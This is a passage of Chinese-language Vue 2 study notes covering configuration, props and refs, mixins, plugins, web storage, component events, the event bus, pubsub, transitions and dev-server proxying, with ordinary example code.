3. 在生产完成后统一使用 webpack 打包后已经实现了 .vue 文件的转换，所以此时再放入模板解析器就显得文件很大（占三分之一），没有必要。
4. render函数传入的其实是一个函数 createElement()，传入参数后会进行元素创建



### 修改默认配置

vue 将所有关于 webpack 的配置隐藏起来了，防止破坏。

使用命令 `vue inspect > output.js` 可以把所有的配置整理成一个 output.js 文件。因为里面是一个对象格式，默认会报错，只要将其赋值一下 `const a = {xxx}` 或是暴露出去就可以了 `export default {xxx}`

output.js 只是整合后输出的配置文件，修改这个文件并不能修改真正的配置内容。

默认的配置名称如：public、favicon.ico、index.html、src、main.js尽量不要修改，其他的名称可以修改，修改路径[参考官网配置参数选项设置](https://cli.vuejs.org/zh/config/)

先要在文件夹中新建一个 vue.config.js 文件，然后根据官网给出的配置修改代码，进行自主配置路径和名称

如下面的修改，修改保存之后即可修改入口文件名称为 abc.js 且重启服务 `npm run serve` 后可以运行，不会报错。（官网pages项、lintOnSave项）

```js
module.exports = {
  pages: {
    index: {
      // page 的入口
      entry: 'src/index/abc.js',
  },
  lintOnSave: false,   // 关闭 lint 语法检查
}}
```



## ref 和 props

### ref

1. 和 id 相同点：都可以用来给节点打标识，以获取节点的信息。
2. 不同点：id 获取到的是结构，而 ref 获取到的是 vc 实例对象
3. 读取方法：this.$refs.xxxxxx
4. 被用来给元素或子组件（因为在 APP 组建内部可以使用 School 标签，所以父子级关系很清楚）注册引用信息（id的替代者）
5. 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）
6. 使用方式：
	1. 打标识：```<h1 ref="xxx">.....</h1>``` 或 ```<School ref="xxx"></School>```
	2. 获取：```this.$refs.xxx```

```vue
<template>
	<div>
		<h1 v-text="msg" ref="title"></h1>
		<button ref="btn" @click="showDOM">点我输出上方的DOM元素</button>
		<School ref="sch"/>
	</div>
</template>

<script>
	//引入School组件
	import School from './components/School'

	export default {
		name:'App',
		components:{School},
		data() {
			return {
				msg:'欢迎学习Vue！'
			}
		},
		methods: {
			showDOM(){
				console.log(this.$refs.title) //真实DOM元素
				console.log(this.$refs.btn) //真实DOM元素
				console.log(this.$refs.sch) //School组件的实例对象（vc）
			}
		},
	}
</script>

```



### props

1. props 中的数据是外部传进来的，所以不能修改，但是可以通过在 data 中定义一个新的变量存放传入的参数值，再通过绑定修改自己创建的变量值来达到改变数据的目的。
2. 功能：让组件接收外部传过来的数据
3. 传递数据：```<Demo name="xxx"/>```

4. 接收数据：

	1. 第一种方式（只接收）：```props:['name'] ```

	2. 第二种方式（限制类型）：```props:{name:String}```

	3. 第三种方式（限制类型、限制必要性、指定默认值）

School.vue（子组件，接收参数）：

```vue
<template>
	<div>
		<h1>{{msg}}</h1>
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
		<h2>学生年龄：{{myAge+1}}</h2>
		<button @click="updateAge">尝试修改收到的年龄</button>
	</div>
</template>

<script>
	export default {
		name:'Student',
		data() {
			console.log(this)
			return {
				msg:'我是一个尚硅谷的学生',
				myAge:this.age
			}
		},
		methods: {
			updateAge(){
				this.myAge++
			}
		},
		//简单声明接收
		// props:['name','age','sex'] 

		//接收的同时对数据进行类型限制
		/* props:{
			name:String,
			age:Number,
			sex:String
		} */

		//接收的同时对数据：进行类型限制+默认值的指定+必要性的限制
		props:{
			name:{
				type:String, //name的类型是字符串
				required:true, //name是必要的，必须要传，所以和 default 二选一，不同时出现
			},
			age:{
				type:Number,
				default:99 //默认值，即age 可传可不传
			},
			sex:{
				type:String,
				required:true
			}
		}
	}
</script>
```

App.vue（传入数据，注意 v-bind 的使用）：

```vue
<template>
	<div>
		<!-- 通过 ：，即 v-bind：的缩写将 age 的类型转换为 Number,因为加上v-bind后会将=后面的内容当做表达式执行 -->
		<Student name="李四" sex="女" :age="18"/>   
	</div>
</template>

<script>
	import Student from './components/Student'

	export default {
		name:'App',
		components:{Student}
	}
</script>

```



## mixin(混入)

[官网](https://v2.cn.vuejs.org/v2/guide/mixins.html)：https://v2.cn.vuejs.org/v2/guide/mixins.html、[全局API Vue.mixin](https://v2.cn.vuejs.org/v2/api/?#Vue-mixin)

一个混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被“混合”进入该组件本身的选项。

```js
// 定义一个混入对象
var myMixin = {
  created: function () {  // 生命周期钩子，在创建实例对象的时候会执行 hello 方法
    this.hello()
  },
  methods: {
    hello: function () {
      console.log('hello from mixin!')
    }
  }
}

// 定义一个使用混入对象的组件
var Component = Vue.extend({
  mixins: [myMixin]
})

var component = new Component() // => "hello from mixin!"
```

当组件和混入对象含有同名选项时，这些选项将以恰当的方式进行“合并”。比如，数据对象在内部会进行递归合并，并在发生冲突时以组件数据优先。

```js
var mixin = {
  data: function () {
    return {
      message: 'hello',
      foo: 'abc'
    }
  }
}

new Vue({
  mixins: [mixin],
  data: function () {
    return {
      message: 'goodbye',
      bar: 'def'
    }
  },
  created: function () {
    console.log(this.$data)
    // => { message: "goodbye", foo: "abc", bar: "def" }
  }
})
```

同名钩子函数将合并为一个数组，因此都将被调用。另外，混入对象的钩子将在组件自身钩子**之前**调用。

```js
var mixin = {
  created: function () {
    console.log('混入对象的钩子被调用')
  }
}

new Vue({
  mixins: [mixin],
  created: function () {
    console.log('组件钩子被调用')
  }
})

// => "混入对象的钩子被调用"
// => "组件钩子被调用"
```

值为对象的选项，例如 `methods`、`components` 和 `directives`，将被合并为同一个对象。两个对象键名冲突时，取组件对象的键值对。

```js
var mixin = {
  methods: {
    foo: function () {
      console.log('foo')
    },
    conflicting: function () {
      console.log('from mixin')
    }
  }
}

var vm = new Vue({
  mixins: [mixin],
  methods: {
    bar: function () {
      console.log('bar')
    },
    conflicting: function () {
      console.log('from self')
    }
  }
})

vm.foo() // => "foo"
vm.bar() // => "bar"
vm.conflicting() // => "from self"
```

注意：`Vue.extend()` 也使用同样的策略进行合并。



将School.vue 和 Student.vue 中相同的代码放入一个新创建的 mixin.js 文件中，然后分别在钱买那两个文件中导入使用即可（局部混入）

mixin.js中：

```js
export const hunhe = {
	methods: {
		showName(){
			alert(this.name)
		}
	},
	mounted() {
		console.log('你好啊！')
	},
}
export const hunhe2 = {
	data() {
		return {
			x:100,
			y:200
		}
	},
}

```

Student.vue中：

```vue
<template>
	<div>
		<h2 @click="showName">学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
	</div>
</template>

<script>
	//引入一个hunhe
	// import {hunhe,hunhe2} from '../mixin'

	export default {
		name:'School',
		data() {
			return {
				name:'尚硅谷',
				address:'北京',
				x:666
			}
		},
		// mixins:[hunhe,hunhe2],
	}
</script>
```

School.vue 中：

```vue
<template>
	<div>
		<h2 @click="showName">学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
	</div>
</template>

<script>
	//引入一个hunhe
	// import {hunhe,hunhe2} from '../mixin'

	export default {
		name:'School',
		data() {
			return {
				name:'尚硅谷',
				address:'北京',
				x:666
			}
		},
		// mixins:[hunhe,hunhe2],
	}
</script>
```

此时功能和各写各的代码是一样的。同时还可以进行全局混入，此时所有的 vm 和 vc 身上都将有混入的配置，在 main.js中：

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
import {hunhe,hunhe2} from './mixin'
//关闭Vue的生产提示
Vue.config.productionTip = false

Vue.mixin(hunhe)
Vue.mixin(hunhe2)


//创建vm
new Vue({
	el:'#app',
	render: h => h(App)
})
```



## 插件

[官网文档](https://v2.cn.vuejs.org/v2/guide/plugins.html)、[全局 API use](https://v2.cn.vuejs.org/v2/api/?#Vue-use)

插件通常用来为 Vue 添加全局功能。插件的功能范围没有严格的限制—— 一般有下面几种：

1. 添加全局方法或者 property。如：[vue-custom-element](https://github.com/karol-f/vue-custom-element)
2. 添加全局资源：指令/过滤器/过渡等。如 [vue-touch](https://github.com/vuejs/vue-touch)
3. 通过全局混入来添加一些组件选项。如 [vue-router](https://github.com/vuejs/vue-router)
4. 添加 Vue 实例方法，通过把它们添加到 `Vue.prototype` 上实现。
5. 一个库，提供自己的 API，同时提供上面提到的一个或多个功能。如 [vue-router](https://github.com/vuejs/vue-router)



### 使用插件

通过全局方法 `Vue.use()` 使用插件。它需要在你调用 `new Vue()` 启动应用之前完成：

```js
// 调用 `MyPlugin.install(Vue)`
Vue.use(MyPlugin)

new Vue({
  // ...组件选项
})
```

也可以传入一个可选的选项对象：

```js
Vue.use(MyPlugin, { someOption: true })
```

Vue.js 官方提供的一些插件 (例如 `vue-router`) 在检测到 `Vue` 是可访问的全局变量时会自动调用 `Vue.use()`。然而在像 CommonJS 这样的模块环境中，你应该始终显式地调用 `Vue.use()`：

```js
// 用 Browserify 或 webpack 提供的 CommonJS 模块环境时
var Vue = require('vue')
var VueRouter = require('vue-router')

// 不要忘了调用此方法
Vue.use(VueRouter)
```

[awesome-vue](https://github.com/vuejs/awesome-vue#components--libraries) 集合了大量由社区贡献的插件和库。



### 开发插件

Vue.js 的插件应该暴露一个 `install` 方法。这个方法的第一个参数是 `Vue` 构造器，第二个参数是一个可选的选项对象：

```js
MyPlugin.install = function (Vue, options) {
  // 1. 添加全局方法或 property
  Vue.myGlobalMethod = function () {
    // 逻辑...
  }

  // 2. 添加全局资源
  Vue.directive('my-directive', {
    bind (el, binding, vnode, oldVnode) {
      // 逻辑...
    }
    ...
  })

  // 3. 注入组件选项
  Vue.mixin({
    created: function () {
      // 逻辑...
    }
    ...
  })

  // 4. 添加实例方法
  Vue.prototype.$myMethod = function (methodOptions) {
    // 逻辑...
  }
}
```



### 总结

1. 功能：用于增强Vue

2. 本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。

3. 定义插件：

	```js
	对象.install = function (Vue, options) {
	    // 1. 添加全局过滤器
	    Vue.filter(....)
	
	    // 2. 添加全局指令
	    Vue.directive(....)
	
	    // 3. 配置全局混入(合)
	    Vue.mixin(....)
	
	    // 4. 添加实例方法
	    Vue.prototype.$myMethod = function () {...}
	    Vue.prototype.$myProperty = xxxx
	}
	```

4. 使用插件：```Vue.use()```



## scoped样式

所有的组件在经过整合后，其中的样式是会组合到一起的，所以可能会出现类名冲突等问题。

在类名冲突时，根据 App.vue 中引入组件的先后顺序，会出现样式覆盖问题，显示后面的样式。

解决方法是在 组件内部样式区域添加 scoped 字样，意为局部的，将样式限制在只能在该组件内部的结构上生效。

原理：为每个用到该局域样式的结构随机生成一个数，并根据属性选择器将其选出并赋予样式。

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302112125352.png" alt="image-20230211212547188" style="zoom: 67%;" />

使用命令 `npm view xxx versions` 可以查看某个安装包的所有版本

备注：不可以在 App.vue 的样式中写 scoped

```vue
<style scoped>
/* 此样式只能被所在的组件结构使用，而不能被其他组件的结构使用 */
</style>

<style lang="less">
/* lang 属性为 style 内部语言的控制，默认是css */
</style>
```



## 组件化编码流程

==缩进快捷键：选中代码->tab:往后缩  shift+tab:往前进==



## 总结TodoList案例

1. 组件化编码流程：

	​	(1).拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。

	​	(2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：

	​			1).一个组件在用：放在组件自身即可。

	​			2). 一些组件在用：放在他们共同的父组件上（<span style="color:red">状态提升</span>）。

	​	(3).实现交互：从绑定事件开始。

2. props适用于：

	​	(1).父组件 ==> 子组件 通信

	​	(2).子组件 ==> 父组件 通信（要求父先给子一个函数）

3. 使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！

4. props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。



## webStorage（本地存储缓存）

1. 存储内容大小一般支持5MB左右（不同浏览器可能还不一样）

2. 浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。

3. 相关API：

	1. ```xxxxxStorage.setItem('key', 'value');```
			该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。

	2. ```xxxxxStorage.getItem('person');```

		​		该方法接受一个键名作为参数，返回键名对应的值。

	3. ```xxxxxStorage.removeItem('key');```

		​		该方法接受一个键名作为参数，并把该键名从存储中删除。

	4. ``` xxxxxStorage.clear()```

		​		该方法会清空存储中的所有数据。

4. 备注：

	1. SessionStorage存储的内容会随着浏览器窗口关闭而消失。
	2. LocalStorage存储的内容，需要手动清除才会消失。
	3. ```xxxxxStorage.getItem(xxx)```如果xxx对应的value获取不到，那么getItem的返回值是null。
	4. ```JSON.parse(null)```的结果依然是null。

localstorage.html：

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>localStorage</title>
	</head>
	<body>
		<h2>localStorage</h2>
		<button onclick="saveData()">点我保存一个数据</button>
		<button onclick="readData()">点我读取一个数据</button>
		<button onclick="deleteData()">点我删除一个数据</button>
		<button onclick="deleteAllData()">点我清空一个数据</button>

		<script type="text/javascript" >
			let p = {name:'张三',age:18}

			function saveData(){
				localStorage.setItem('msg','hello!!!')
				localStorage.setItem('msg2',666)
				localStorage.setItem('person',JSON.stringify(p))
			}
			function readData(){
				console.log(localStorage.getItem('msg'))
				console.log(localStorage.getItem('msg2'))

				const result = localStorage.getItem('person')
				console.log(JSON.parse(result))

				// console.log(localStorage.getItem('msg3'))
			}
			function deleteData(){
				localStorage.removeItem('msg2')
			}
			function deleteAllData(){
				localStorage.clear()
			}
		</script>
	</body>
</html>
```

sessionStorage.html：

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>sessionStorage</title>
	</head>
	<body>
		<h2>sessionStorage</h2>
		<button onclick="saveData()">点我保存一个数据</button>
		<button onclick="readData()">点我读取一个数据</button>
		<button onclick="deleteData()">点我删除一个数据</button>
		<button onclick="deleteAllData()">点我清空一个数据</button>

		<script type="text/javascript" >
			let p = {name:'张三',age:18}

			function saveData(){
				sessionStorage.setItem('msg','hello!!!')
				sessionStorage.setItem('msg2',666)
				sessionStorage.setItem('person',JSON.stringify(p))
			}
			function readData(){
				console.log(sessionStorage.getItem('msg'))
				console.log(sessionStorage.getItem('msg2'))

				const result = sessionStorage.getItem('person')
				console.log(JSON.parse(result))

				// console.log(sessionStorage.getItem('msg3'))
			}
			function deleteData(){
				sessionStorage.removeItem('msg2')
			}
			function deleteAllData(){
				sessionStorage.clear()
			}
		</script>
	</body>
</html>
```





## 组件的自定义事件

给谁绑定自定义事件（如标签 \<Student>\</Student>）, 就在这个标签对应的组件文件中编写触发条件

[vm.$emit()](https://v2.cn.vuejs.org/v2/api/?#vm-emit)、[vm.$on()](https://v2.cn.vuejs.org/v2/api/?#vm-on)、[vm.$off()](https://v2.cn.vuejs.org/v2/api/?#vm-off)、[vm.$destory()](https://v2.cn.vuejs.org/v2/api/?#vm-destroy)

[自定义事件](https://v2.cn.vuejs.org/v2/guide/components-custom-events.html)

总结：

1. 一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。

3. 绑定自定义事件：

	1. 第一种方式，在父组件中：```<Demo @atguigu="test"/>```  或 ```<Demo v-on:atguigu="test"/>```

	2. 第二种方式，在父组件中：

		```js
		<Demo ref="demo"/>
		......
		mounted(){
		   this.$refs.xxx.$on('atguigu',this.test)
		}
		```

	3. 若想让自定义事件只能触发一次，可以使用```once```修饰符，或```$once```方法。

4. 触发自定义事件：```this.$emit('atguigu',数据)```		

5. 解绑自定义事件```this.$off('atguigu')```

6. 组件上也可以绑定原生DOM事件，需要使用```native```修饰符。

7. 注意：通过```this.$refs.xxx.$on('atguigu',回调)```绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！

Student.vue文件：

```vue
<template>
	<div class="student">
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
		<h2>当前求和为：{{number}}</h2>
		<button @click="add">点我number++</button>
		<button @click="sendStudentlName">把学生名给App</button>
		<button @click="unbind">解绑atguigu事件</button>
		<button @click="death">销毁当前Student组件的实例(vc)</button>
	</div>
</template>

<script>
	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
				sex:'男',
				number:0
			}
		},
		methods: {
			add(){
				console.log('add回调被调用了')
				this.number++
			},
			sendStudentlName(){
				//触发Student组件实例身上的atguigu事件
				this.$emit('atguigu',this.name,666,888,900)
				// this.$emit('demo')
				// this.$emit('click')
			},
			unbind(){
				this.$off('atguigu') //解绑一个自定义事件
				// this.$off(['atguigu','demo']) //解绑多个自定义事件
				// this.$off() //解绑所有的自定义事件
			},
			death(){
				this.$destroy() //销毁了当前Student组件的实例，销毁后所有Student实例的自定义事件全都不奏效。
			}
		},
	}
</script>

<style lang="less" scoped>
	.student{
		background-color: pink;
		padding: 5px;
		margin-top: 30px;
	}
</style>

```

School.vue文件：

```vue
<template>
	<div class="school">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<button @click="sendSchoolName">把学校名给App</button>
	</div>
</template>

<script>
	export default {
		name:'School',
		props:['getSchoolName'],
		data() {
			return {
				name:'尚硅谷',
				address:'北京',
			}
		},
		methods: {
			sendSchoolName(){
				this.getSchoolName(this.name)
			}
		},
	}
</script>

<style scoped>
	.school{
		background-color: skyblue;
		padding: 5px;
	}
</style>
```

App.vue 文件：

```vue
<template>
	<div class="app">
		<h1>{{msg}}，学生姓名是:{{studentName}}</h1>

		<!-- 通过父组件给子组件传递函数类型的props实现：子给父传递数据 -->
		<School :getSchoolName="getSchoolName"/>

		<!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第一种写法，使用@或v-on） -->
		<!-- <Student @atguigu="getStudentName" @demo="m1"/> -->

		<!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第二种写法，使用ref） -->
		<Student ref="student" @click.native="show"/>
	</div>
</template>

<script>
	import Student from './components/Student'
	import School from './components/School'

	export default {
		name:'App',
		components:{School,Student},
		data() {
			return {
				msg:'你好啊！',
				studentName:''
			}
		},
		methods: {
			getSchoolName(name){
				console.log('App收到了学校名：',name)
			},
			getStudentName(name,...params){
				console.log('App收到了学生名：',name,params)
				this.studentName = name
			},
			m1(){
				console.log('demo事件被触发了！')
			},
			show(){
				alert(123)
			}
		},
		mounted() {
			this.$refs.student.$on('atguigu',this.getStudentName) //绑定自定义事件
			// this.$refs.student.$once('atguigu',this.getStudentName) //绑定自定义事件（一次性）
		},
	}
</script>

<style scoped>
	.app{
		background-color: gray;
		padding: 5px;
	}
</style>

```



## 全局事件总线

### 理解

1. Vue 原型对象上包含事件处理的方法

	1) $on(eventName, listener): 绑定自定义事件监听

	2) $emit(eventName, data): 分发自定义事件

	3) $off(eventName): 解绑自定义事件监听

	4) $once(eventName, listener): 绑定事件监听, 但只能处理一次

2. 所有组件实例对象的原型对象的原型对象就是 Vue 的原型对象

	1) 所有组件对象都能看到 Vue 原型对象上的属性和方法

	2) Vue.prototype.\$bus = new Vue(), 所有的组件对象都能看到 $bus 这个属性对象

3. 全局事件总线

	1) 包含事件处理相关方法的对象(只有一个)

	2) 所有的组件都可以得到



### 使用

1. 一种组件间通信的方式，适用于任意组件间通信。

2. 安装全局事件总线：

	```js
	new Vue({
		......
		beforeCreate() {
			Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
		},
	    ......
	}) 
	```

3. 使用事件总线：

	1. 接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的<span style="color:red">回调留在A组件自身。</span>

		```js
		methods(){
		  demo(data){......}
		}
		......
		mounted() {
		  this.$bus.$on('xxxx',this.demo)
		}
		```

	2. 提供数据：```this.$bus.$emit('xxxx',数据)```

4. 最好在beforeDestroy钩子中，用$off去解绑<span style="color:red">当前组件所用到的</span>事件。

School.vue 文件：（将学生姓名传递）

```vue
<template>
	<div class="school">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
	</div>
</template>

<script>
	export default {
		name:'School',
		data() {
			return {
				name:'尚硅谷',
				address:'北京',
			}
		},
		mounted() {
			// console.log('School',this)
			this.$bus.$on('hello',(data)=>{
				console.log('我是School组件，收到了数据',data)
			})
		},
		beforeDestroy() {
			this.$bus.$off('hello')  // 只清除与该组件有关的自定义事件，如果不带参数就意味着清除了所有的组件的自定义事件
		},
	}
</script>

<style scoped>
	.school{
		background-color: skyblue;
		padding: 5px;
	}
</style>
```

Student.vue 文件：

```vue
<template>
	<div class="student">
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
		<button @click="sendStudentName">把学生名给School组件</button>
	</div>
</template>

<script>
	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
				sex:'男',
			}
		},
		mounted() {
			// console.log('Student',this.x)
		},
		methods: {
			sendStudentName(){
				this.$bus.$emit('hello',this.name)
			}
		},
	}
</script>

<style lang="less" scoped>
	.student{
		background-color: pink;
		padding: 5px;
		margin-top: 30px;
	}
</style>

```

App.vue 中：

```vue
<template>
	<div class="app">
		<h1>{{msg}}</h1>
		<School/>
		<Student/>
	</div>
</template>

<script>
	import Student from './components/Student'
	import School from './components/School'

	export default {
		name:'App',
		components:{School,Student},
		data() {
			return {
				msg:'你好啊！',
			}
		}
	}
</script>

<style scoped>
	.app{
		background-color: gray;
		padding: 5px;
	}
</style>

```



## 消息订阅与发布（pubsub）

1.   一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

2. 使用步骤：

	1. 安装pubsub：```npm i pubsub-js```

	2. 引入: ```import pubsub from 'pubsub-js'```

	3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red">回调留在A组件自身。</span>

		```js
		methods(){
		  demo(data){......}
		}
		......
		mounted() {
		  this.pid = pubsub.subscribe('xxx',this.demo) //订阅消息
		}
		```

	4. 提供数据：```pubsub.publish('xxx',数据)```

	5. 最好在beforeDestroy钩子中，用```PubSub.unsubscribe(pid)```去<span style="color:red">取消订阅。</span>

School.vue 文件接收数据：

```vue
<template>
	<div class="school">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
	</div>
</template>

<script>
	import pubsub from 'pubsub-js'
	export default {
		name:'School',
		data() {
			return {
				name:'尚硅谷',
				address:'北京',
			}
		},
		mounted() {
			// console.log('School',this)
			/* this.$bus.$on('hello',(data)=>{
				console.log('我是School组件，收到了数据',data)
			}) */
			this.pubId = pubsub.subscribe('hello',(msgName,data)=>{
				console.log(this)
				// console.log('有人发布了hello消息，hello消息的回调执行了',msgName,data)
			})
		},
		beforeDestroy() {
			// this.$bus.$off('hello')
			pubsub.unsubscribe(this.pubId)
		},
	}
</script>

<style scoped>
	.school{
		background-color: skyblue;
		padding: 5px;
	}
</style>
```

Student.vue文件发送数据：

```vue
<template>
	<div class="student">
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
		<button @click="sendStudentName">把学生名给School组件</button>
	</div>
</template>

<script>
	import pubsub from 'pubsub-js'
	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
				sex:'男',
			}
		},
		mounted() {
			// console.log('Student',this.x)
		},
		methods: {
			sendStudentName(){
				// this.$bus.$emit('hello',this.name)
				pubsub.publish('hello',666)
			}
		},
	}
</script>

<style lang="less" scoped>
	.student{
		background-color: pink;
		padding: 5px;
		margin-top: 30px;
	}
</style>

```



## nextTick

[$nextTick](https://v2.cn.vuejs.org/v2/api/?#Vue-nextTick)

1. 语法：```this.$nextTick(回调函数)```
2. 作用：在下一次 DOM 更新结束后执行其指定的回调。
3. 什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。



## Vue封装的过度与动画

1. 作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。

2. 图示：

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302132346366.png" alt="image-20230213234652221" style="zoom:50%;" />

3. 写法：

	1. 准备好样式：

		- 元素进入的样式：
			1. v-enter：进入的起点
			2. v-enter-active：进入过程中
			3. v-enter-to：进入的终点

		- 元素离开的样式：
			1. v-leave：离开的起点
			2. v-leave-active：离开过程中
			3. v-leave-to：离开的终点

	2. 使用```<transition>```包裹要过度的元素，并配置name属性：

	```vue
	<transition name="hello">
		<h1 v-show="isShow">你好啊！</h1>
	</transition>
	```

	3. 备注：若有多个元素需要过度，则需要使用：```<transition-group>```，且每个元素都要指定```key```值。
	4. 可以只使用 xxx-enter-active 与 xxx-leave-active 进行动画编写，也可以通过编写 xxx-enter 和 xxx-enter-to 样式指定过渡，过渡时间和速度变化需要写在使用过渡的元素身上或是写在 xxx-enter/leave-active 中
	5. 也可以使用第三方样式库如 animate.css 库等，引入 css 库只需要 `import "animate.css"` 即可

第一种写法，text.vue（使用动画）：

```vue
<template>
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<transition name="hello" appear>
			<h1 v-show="isShow">你好啊！</h1>
		</transition>
	</div>
</template>

<script>
	export default {
		name:'Test',
		data() {
			return {
				isShow:true
			}
		},
	}
</script>

<style scoped>
	h1{
		background-color: orange;
	}

	.hello-enter-active{
		animation: atguigu 0.5s linear;
	}

	.hello-leave-active{
		animation: atguigu 0.5s linear reverse;
	}

	@keyframes atguigu {
		from{
			transform: translateX(-100%);
		}
		to{
			transform: translateX(0px);
		}
	}
</style>
```

第二种写法，test2.vue（使用过渡）：

```vue
<template>
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<transition-group name="hello" appear>
			<h1 v-show="!isShow" key="1">你好啊！</h1>
			<h1 v-show="isShow" key="2">尚硅谷！</h1>
		</transition-group>
	</div>
</template>

<script>
	export default {
		name:'Test',
		data() {
			return {
				isShow:true
			}
		},
	}
</script>

<style scoped>
	h1{
		background-color: orange;
	}
	/* 进入的起点、离开的终点 */
	.hello-enter,.hello-leave-to{
		transform: translateX(-100%);
	}
	.hello-enter-active,.hello-leave-active{
		transition: 0.5s linear;
	}
	/* 进入的终点、离开的起点 */
	.hello-enter-to,.hello-leave{
		transform: translateX(0);
	}

</style>
```

第三种方法，test3.vue（使用第三方库）：

```vue
<template>
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<transition-group 
			appear
			name="animate__animated animate__bounce" 
			enter-active-class="animate__swing"
			leave-active-class="animate__backOutUp"
		>
			<h1 v-show="!isShow" key="1">你好啊！</h1>
			<h1 v-show="isShow" key="2">尚硅谷！</h1>
		</transition-group>
	</div>
</template>

<script>
	import 'animate.css'
	export default {
		name:'Test',
		data() {
			return {
				isShow:true
			}
		},
	}
</script>

<style scoped>
	h1{
		background-color: orange;
	}
	

</style>
```





# vue中的 ajax 请求

### vue 脚手架中的配置代理 / vue 中的 ajax 请求

同源策略：同网络协议、同主机名、同端口号；在跨域问题中，细节：浏览器可以发送跨域请求，同时服务器会收到请求并且回发数据，但是浏览器收到了数据却并没有交给我们（程序员）。

跨域问题解决方案：

1. 后端服务器人员配置返回的响应头，CORS
2. 使用 json-p 技术，前后端人员一起设置
3. 使用代理服务器，如 nginx 或 vue-cli，代理服务器所处的端口始终与前端页面处于同源，通过代理服务器和数据服务器之间通过 http 请求交互数据，再通过代理服务器传送数据给前端页面（最多使用）
4. 搭配的最多的是 axios 技术，虽然 jQuery 也可以但是相对来说体积更大（1/4）。

###### [devServer.proxy](https://cli.vuejs.org/zh/config/#devserver-proxy)

当配置完代理服务器之后，public 目录相当于代理服务器的根目录，其中的资源相当于代理服务器的前端资源，会优先从代理服务器中获取资源，如果有就不会再向数据服务器请求资源。

==有两种方法：==

#### 方法一

​	在vue.config.js中添加如下配置：

```js
devServer:{
  proxy:"http://localhost:5000"
}
```

说明：

1. 优点：配置简单，请求资源时直接发给前端（8080）即可。
2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理。
3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）

#### 方法二

​	编写vue.config.js配置具体代理规则：

```js
module.exports = {
	devServer: {
      proxy: {
      '/api1': {// 匹配所有以 '/api1'开头的请求路径
        target: 'http://localhost:5000',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api1': ''}
      },
      '/api2': {// 匹配所有以 '/api2'开头的请求路径
        target: 'http://localhost:5001',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api2': ''}
      }
    }
  }
}
/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/
```

说明：

1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理。
2. 缺点：配置略微繁琐，请求资源时必须加前缀。



App.vue 中：

```vue
<template>
	<div>
		<button @click="getStudents">获取学生信息</button>
		<button @click="getCars">获取汽车信息</button>
	</div>
</template>

<script>
	import axios from 'axios'
	export default {
		name:'App',
		methods: {
			getStudents(){
				axios.get('http://localhost:8080/students').then(
					response => {
						console.log('请求成功了',response.data)
					},
					error => {
						console.log('请求失败了',error.message)
					}
				)
			},
			getCars(){
				axios.get('http://localhost:8080/demo/cars').then(
					response => {
						console.log('请求成功了',response.data)
					},
					error => {
